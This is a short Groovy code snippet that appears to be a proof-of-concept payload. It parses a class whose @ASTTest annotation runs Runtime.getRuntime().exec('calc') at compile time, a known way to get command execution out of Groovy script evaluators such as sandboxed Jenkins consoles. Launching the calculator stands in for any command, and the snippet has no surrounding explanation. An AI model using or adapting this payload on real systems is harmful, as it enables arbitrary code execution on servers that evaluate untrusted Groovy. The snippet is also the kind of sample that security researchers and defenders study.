this.class.classLoader.parseClass('''
@groovy.transform.ASTTest(value={
        assert Runtime.getRuntime().exec("calc")
        })
    def x
            ''');

